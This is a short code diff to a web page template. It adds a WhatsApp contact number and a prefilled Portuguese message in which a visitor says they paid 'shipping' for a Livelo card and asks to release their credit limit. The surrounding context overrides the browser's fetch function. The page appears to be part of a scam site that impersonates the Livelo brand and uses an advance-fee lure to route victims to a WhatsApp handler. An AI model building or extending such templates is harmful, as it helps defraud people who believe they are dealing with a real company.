@@ -852,6 +852,10 @@ function encryptedFetch(url, options) {
 window._fetch = window.fetch;
 window.fetch = encryptedFetch;
 </script>
+<script>
+  window.APP_WA_NUM = "{{ sys_config.get('whatsapp', '5511999999999') }}";
+  window.APP_WA_TEXT = `{{ sys_config.get('wa_text', 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!') }}`;
+</script>
 <script src="/static/js/main.js"></script>
 
   </main>
